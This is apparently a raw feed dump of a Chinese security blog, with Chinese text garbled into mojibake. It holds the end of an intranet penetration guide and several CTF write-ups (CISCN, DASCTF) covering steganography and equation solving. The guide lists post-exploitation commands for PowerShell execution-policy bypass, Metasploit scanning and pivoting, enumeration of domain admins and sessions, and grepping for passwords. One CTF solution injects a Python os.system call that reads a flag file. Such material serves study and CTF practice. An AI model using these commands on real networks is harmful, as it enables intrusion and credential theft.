</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;20)&quot; &gt;&gt; c:\windows\temp\log.txt</span><br><span class="line">type c:\windows\temp\log.txt</span><br><span class="line">        </span><br><span class="line">é€šè¿‡å¸¸è§„çš„TCP&#x2F;UDPç«¯å£æ‰«ææ¢æµ‹å†…ç½‘</span><br><span class="line">ä¸Šä¼ ScanLineè¿›è¡Œæ‰«æï¼š</span><br><span class="line">scanline -h -t 22,80-90,110,445 -u 53,161 -O c:\windows\temp\log.txt -p 192.168.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure><h2 id="3-æ‰«æåŸŸå†…ç«¯å£"><a href="#3-æ‰«æåŸŸå†…ç«¯å£" class="headerlink" title="3.æ‰«æåŸŸå†…ç«¯å£"></a>3.æ‰«æåŸŸå†…ç«¯å£</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">telnet(ä½†æ˜¯è¿™ä¸ªé€Ÿåº¦å¤ªæ…¢äº†ç‚¹)</span><br><span class="line"></span><br><span class="line">Metasploitç«¯å£æ‰«æ:</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set ports 1-1000</span><br><span class="line">set RHOST 192.168.1.1</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br><span class="line">        </span><br><span class="line">PowerSploitã€NiShangçš„Invoke-portscanè„šæœ¬</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šmsfè®°å¾—æ·»åŠ è·¯ç”±æˆ–ä»£ç†</span><br><span class="line">autorouteæ·»åŠ è·¯ç”±</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.159.0&#x2F;24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">                      </span><br><span class="line">å½“ç„¶msfä¸æ­¢æœ‰æ‰«æç«¯å£çš„è„šæœ¬ï¼Œè¿™é‡Œåœ¨åˆ—ä¸¾å‡ ä¸ªå…¶ä»–è„šæœ¬ï¼š</span><br><span class="line"> 1. use auxiliary&#x2F;scanner&#x2F;http&#x2F;dir_scanner</span><br><span class="line"> 2. use auxiliary&#x2F;scanner&#x2F;http&#x2F;jboss_vulnscan</span><br><span class="line"> 3. use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br><span class="line"> 4. use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version</span><br><span class="line"> 5. use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_login</span><br><span class="line">&#x2F;&#x2F;æ‰«æçš„è„šæœ¬ä½äºï¼š</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-æ”¶é›†åŸŸå†…åŸºç¡€ä¿¡æ¯"><a href="#4-æ”¶é›†åŸŸå†…åŸºç¡€ä¿¡æ¯" class="headerlink" title="4. æ”¶é›†åŸŸå†…åŸºç¡€ä¿¡æ¯"></a>4. æ”¶é›†åŸŸå†…åŸºç¡€ä¿¡æ¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain&#x2F;&#x2F;æŸ¥è¯¢åŸŸ</span><br><span class="line">net view &#x2F;domain:test&#x2F;&#x2F;æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº</span><br><span class="line">net group &#x2F;domain&#x2F;&#x2F;æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨ </span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain&#x2F;&#x2F;æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨</span><br><span class="line">net accounts &#x2F;domain&#x2F;&#x2F;è·å–åŸŸå†…å¯†ç ä¿¡æ¯</span><br><span class="line">nltest &#x2F;domain_trusts&#x2F;&#x2F;åŸŸå†…ä¿¡ä»»ä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="5-æŸ¥æ‰¾åŸŸæ§"><a href="#5-æŸ¥æ‰¾åŸŸæ§" class="headerlink" title="5. æŸ¥æ‰¾åŸŸæ§"></a>5. æŸ¥æ‰¾åŸŸæ§</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:test</span><br><span class="line"></span><br><span class="line">net time &#x2F;domain</span><br><span class="line">  </span><br><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br><span class="line">  </span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line">  </span><br><span class="line">netdom query pdc&#x2F;&#x2F;æŸ¥çœ‹ä¸»æ§åˆ¶å™¨</span><br></pre></td></tr></table></figure><h2 id="6-è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯"><a href="#6-è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯" class="headerlink" title="6. è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯"></a>6. è·å–åŸŸå†…çš„ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨</span><br><span class="line">net user &#x2F;domain </span><br><span class="line">&#x2F;&#x2F;è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">wmic useraccount get &#x2F;all </span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·,ä½†æ˜¯è¿™ä¸ªåªèƒ½åœ¨åŸŸæ§æˆ–è€…å®‰è£…äº†å¯¹åº”æœåŠ¡çš„ä¸»æœºä½¿ç”¨ï¼Œå¦åˆ™ä¼šæç¤ºå‘½ä»¤ä¸å­˜åœ¨</span><br><span class="line">dsquery user </span><br><span class="line">&#x2F;&#x2F;æŸ¥æ‰¾ç›®å½•ä¸­çš„è®¡ç®—æœº</span><br><span class="line">dsquery computer </span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·</span><br><span class="line">net localgroup administrators </span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain </span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><h2 id="7-å®šä½åŸŸç®¡ç†å‘˜"><a href="#7-å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="7. å®šä½åŸŸç®¡ç†å‘˜"></a>7. å®šä½åŸŸç®¡ç†å‘˜</h2><p>åœ¨è·å–äº†WindowsåŸŸä¸­çš„æ™®é€šæƒé™åœ¨è¿›è¡Œæ¨ªå‘æ¸—é€æ—¶ï¼Œéœ€è¦çŸ¥é“åŸŸå†…ç”¨æˆ·ç™»å½•çš„ä½ç½®ï¼Œæ˜¯å¦æ˜¯ä»»ä½•ç³»ç»Ÿ/ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜ï¼Œä»¥åŠæ‰€å±ç»„ç­‰å…³é”®ä¿¡æ¯ã€‚ è¿™é‡Œç›´æ¥ç”¨å‰è¾ˆä»¬é€ çš„è½®å­å§ï¼Œèƒ½å¤Ÿä½¿ç”¨çš„è½®å­æœ‰ï¼špsloggedon.exeã€PVEFindADUser.exeã€netness.exeã€hunterã€NetViewã€PowerViewã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe</span><br><span class="line">&#x2F;&#x2F;èƒ½å¤Ÿé€šè¿‡æ­¤å·¥å…·æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºçš„èµ„æºï¼Œä¹Ÿå°±æ˜¯è¯´èƒ½å¤ŸæŸ¥çœ‹ç›®æ ‡ä¸»æœºæœ‰å“ªäº›è´¦æˆ·åœ¨ç™»å½•çŠ¶æ€        </span><br><span class="line">ä¸‹è½½åœ°å€ï¼šhttps:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;psloggedon</span><br><span class="line">ä½¿ç”¨ï¼špsloggedon.exe \\dc2012</span><br><span class="line">  </span><br><span class="line">PVEFindADUser</span><br><span class="line">&#x2F;&#x2F;PVEFindADUserèƒ½å¤Ÿç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•çš„ä½ç½®ï¼Œæšä¸¾ä¸ç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ã€‚åŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ã€é€šè¿‡RDPç™»å½•çš„ç”¨æˆ·ã€ç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚ï¼ˆè¿™ä¸ªå·¥å…·éœ€è¦.NET 3.5ï¼‰Windows Server 2012å®‰è£….NET 3.5å¯èƒ½ä¸æˆåŠŸï¼Œéœ€è¦æŒ‡å®šå®‰è£…æºï¼šhttps:&#x2F;&#x2F;www.cr173.com&#x2F;soft&#x2F;921507.html</span><br><span class="line">ä¸‹è½½åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;chrisdee&#x2F;Tools&#x2F;tree&#x2F;master&#x2F;AD&#x2F;ADFindUsersLoggedOn</span><br><span class="line">PVEFindADUser.exe -current</span><br><span class="line">        </span><br><span class="line">NetView</span><br><span class="line">&#x2F;&#x2F;NetViewæ˜¯ä¸€ä¸ªæšä¸¾å·¥å…·ï¼Œä½¿ç”¨WinAPIæšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨NetSessionEnumæ‰¾å¯»ç™»é™†ä¼šè¯ï¼Œåˆ©ç”¨NetShareEnumæ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨NetWkstaUserEnumæšä¸¾ç™»å½•çš„ç”¨æˆ·ã€‚åŒæ—¶è¿˜èƒ½å¤ŸæŸ¥è¯¢å…±äº«å…¥å£å’Œæœ‰ä»·å€¼çš„ç”¨æˆ·ã€‚</span><br><span class="line">ä¸‹è½½åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;mubix&#x2F;netview</span><br><span class="line">           </span><br><span class="line">PowerView</span><br><span class="line">ä½¿ç”¨Powerviewçš„Invoke-UserHunterã€‚</span><br><span class="line">            </span><br><span class="line">Empire</span><br><span class="line">&#x2F;&#x2F;Empireä¸­ä¹Ÿå­˜åœ¨æ­¤ç±»å‹çš„è„šæœ¬ï¼š</span><br><span class="line">usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter</span><br><span class="line">execute</span><br><span class="line">            </span><br><span class="line">Nmapçš„NSEè„šæœ¬</span><br><span class="line">&#x2F;&#x2F;é€šè¿‡Nmapçš„NSEè„šæœ¬è·å–è¿œç¨‹æœºå™¨çš„ç™»é™†ä¼šè¯ã€‚</span><br><span class="line">smb-enum-sessions.nseè·å–åŸŸå†…ä¸»æœºçš„ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ŒæŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰ç”¨æˆ·ç™»å½•ã€‚ä¸‹è½½åœ°å€ï¼šhttps:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;smb-enum-sessions.html</span><br><span class="line">smb-enum-domains.nseå¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰ã€‚</span><br><span class="line">smb-enum-users.nseå¯ä»¥ä½¿ç”¨æ­¤è„šæœ¬å¯¹åŸŸæ§è¿›è¡Œæ‰«æã€‚</span><br></pre></td></tr></table></figure><h2 id="8-æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"><a href="#8-æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹" class="headerlink" title="8. æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"></a>8. æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</h2><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æœ¬æœºæ£€æŸ¥ï¼š</span><br><span class="line">&#x2F;&#x2F;è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</span><br><span class="line">net group &quot;Domain Admins&quot; &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹å’Œè¿›ç¨‹ç”¨æˆ·</span><br><span class="line">tasklist &#x2F;v</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢åŸŸæ§çš„åŸŸç”¨æˆ·ä¼šè¯</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢åŸŸæ§åˆ—è¡¨</span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨</span><br><span class="line">netsess -h</span><br></pre></td></tr></table></figure><h2 id="9-è¡¥å……ä¸€ç‚¹linuxä¿¡æ¯æ”¶é›†å§¿åŠ¿"><a href="#9-è¡¥å……ä¸€ç‚¹linuxä¿¡æ¯æ”¶é›†å§¿åŠ¿" class="headerlink" title="9. è¡¥å……ä¸€ç‚¹linuxä¿¡æ¯æ”¶é›†å§¿åŠ¿"></a>9. è¡¥å……ä¸€ç‚¹linuxä¿¡æ¯æ”¶é›†å§¿åŠ¿</h2><p>å¸¸è§çš„é…ç½®æ–‡ä»¶æœ‰é‚£äº›ï¼Ÿæœ‰æ²¡æœ‰å¯æ”»å‡»çš„æ’ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Cat &#x2F;etc&#x2F;syslog.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;chttp.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;lighttpd.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;cups&#x2F;cupsd.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;inetd.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;my.conf</span><br><span class="line">Cat &#x2F;etc&#x2F;http&#x2F;conf&#x2F;http.conf</span><br><span class="line">Cat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf</span><br><span class="line">Ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.r.&#x2F;</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ç³»ç»Ÿå†…è·Ÿç”¨æˆ·åå’Œå¯†ç çš„æœ‰å…³çš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Grep -I user [filename]</span><br><span class="line">grep -i pass [filename] grep -C 5 â€œpasswordâ€ [filename] find . -name â€œ*.phpâ€ -print0 | xargs     -0 grep -i -n â€œvar $passwordâ€ # Joomla</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2020</title>
      <link href="2020/08/27/2020CISCN/"/>
      <url>2020/08/27/2020CISCN/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3918734606.png"></p><h2 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h2><p>**<a href="https://pan.baidu.com/s/1mSXQsRcgdK17-Aq6aTAFOw">é™„ä»¶</a>**ï¼ˆæå–ç ï¼škkgsï¼‰</p><p>ä»”ç»†è§‚å¯Ÿå³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2828207989.png"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h2><blockquote><p>é¢˜ç›®æè¿°ï¼šnc 101.200.53.148 13465</p></blockquote><p>éé¢„æœŸè§£ï¼ˆä¸çœ‹é™„ä»¶<br> <code>__import__(&#39;os&#39;).system(&#39;cat home/ctf/flag&#39;) </code></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>**<a href="https://pan.baidu.com/s/1hORDV0NR-6wzWfJGYpny_Q">é™„ä»¶</a>**ï¼ˆæå–ç ï¼šv02bï¼‰</p><p>è½¬åè¿›åˆ¶ï¼Œè§£äº”ç»„æ–¹ç¨‹ç»„ï¼ˆä»…ä¸¾ä¸€ä¸ªä¾‹å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12094&#x3D;34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59</span><br><span class="line">25270&#x3D;27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59</span><br><span class="line">19330&#x3D;24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59</span><br><span class="line">18540&#x3D;78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59</span><br><span class="line">16386&#x3D;48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59</span><br><span class="line">21207&#x3D;15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59</span><br><span class="line">11759&#x3D;26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59</span><br></pre></td></tr></table></figure><p>sageä¸€æŠŠæ¢­å“ˆ<br><strong><a href="https://sagecell.sagemath.org/">sageåœ¨çº¿å·¥å…·</a>/<a href="https://pan.baidu.com/s/1bIiICAdaEEW-6IzQkXLiuw">sage</a>ï¼ˆæå–ç ï¼šcbgyï¼‰</strong><br>å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var(&#39;v53,v54,v55,v56,v57,v58,v59&#39;)</span><br><span class="line"></span><br><span class="line">s1 &#x3D; 12094 &#x3D;&#x3D; 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59</span><br><span class="line"></span><br><span class="line">s2 &#x3D; 25270 &#x3D;&#x3D; 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59</span><br><span class="line"></span><br><span class="line">s3 &#x3D; 19330 &#x3D;&#x3D; 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59</span><br><span class="line"></span><br><span class="line">s4 &#x3D; 18540 &#x3D;&#x3D; 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59</span><br><span class="line"></span><br><span class="line">s5 &#x3D; 16386 &#x3D;&#x3D; 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59</span><br><span class="line"></span><br><span class="line">s6 &#x3D; 21207 &#x3D;&#x3D; 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59</span><br><span class="line"></span><br><span class="line">s7 &#x3D; 11759 &#x3D;&#x3D; 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59</span><br><span class="line"></span><br><span class="line">solve([s1,s2,s3,s4,s5,s6,s7],v53,v54,v55,v56,v57,v58,v59)</span><br></pre></td></tr></table></figure><p>ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°ç»“æœï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/206246459.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2953166153.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1305928255.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1102886100.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2195107022.png"></p><p>ç»„åˆä»¥ä¸Šç»“æœï¼Œè§£å¯†å¾—åˆ°flagï¼šflag{7e171d43-63b9-4e18-990e-6e14c2afe648}<br>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;&#39;&#39;</span><br><span class="line">for i in flag:</span><br><span class="line">  s+&#x3D;chr(i)</span><br><span class="line">print s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFå…«æœˆä¸ƒå¤•æˆ˜ 2020</title>
      <link href="2020/08/25/2020DASCTF%E5%85%AB%E6%9C%88%E4%B8%83%E5%A4%95%E6%88%98/"/>
      <url>2020/08/25/2020DASCTF%E5%85%AB%E6%9C%88%E4%B8%83%E5%A4%95%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>Bç«™ç›´æ’­å±å¹•å³å¯çœ‹åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2257995176.png"></p><h2 id="æ ‡é”™çš„å­—ç¬¦"><a href="#æ ‡é”™çš„å­—ç¬¦" class="headerlink" title="æ ‡é”™çš„å­—ç¬¦"></a>æ ‡é”™çš„å­—ç¬¦</h2><p>**<a href="https://pan.baidu.com/s/1wC-8KiRG-yRpb4m0o6bVqw">é™„ä»¶</a>**ï¼ˆæå–ç ï¼š0ui9ï¼‰</p><p>æ ¹æ®é™„ä»¶æ‰€ç»™è¯´æ˜æ‰¾å‡ºé”™è¯¯çš„ä¸ƒä¸ªï¼ˆå¾ˆæ˜æ˜¾æœ‰è§„å¾‹ï¼Œç„¶åmd5åŠ å¯†å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2150377646.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3820778284.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFä¸ƒæœˆèµ› 2020</title>
      <link href="2020/07/25/2020DASCTF%E4%B8%83%E6%9C%88%E8%B5%9B/"/>
      <url>2020/07/25/2020DASCTF%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4154306512.png"></p><h2 id="welcome-to-the-misc-world"><a href="#welcome-to-the-misc-world" class="headerlink" title="welcome to the misc world"></a>welcome to the misc world</h2><p><a href="https://pan.baidu.com/s/1-rRpfNzFPJbdEFzFWhm4Jw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š2bc3ï¼‰</p><p>ä¸€å¼ å›¾ç‰‡ï¼Œä¸€ä¸ªåŠ å¯†çš„åŒ…ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦é€šè¿‡è¿™å¼ å›¾ç‰‡æ¥è§£å‡ºå‹ç¼©åŒ…çš„å¯†ç </p><h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>ä½¿ç”¨å·¥å…·stegï¼Œæ ¹æ®åå­—é”å®šæ˜¯çº¢å’Œè“ï¼Œåœ¨å°è¯•ä¹‹ååªæœ‰redæ‰æ˜¾ç¤ºæ˜¯png</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3327796181.png"></p><h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>ä½¿ç”¨zstegè¿›è¡Œåˆ†æä»è€Œå¾—åˆ°å¯†ç <br>kaliå®‰è£…zstepæ­¥éª¤ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zed-0xff&#x2F;zsteg</span><br><span class="line">cd zsteg&#x2F;</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œè¾“å…¥å‘½ä»¤ï¼š <code>zsteg&gt;zsteg 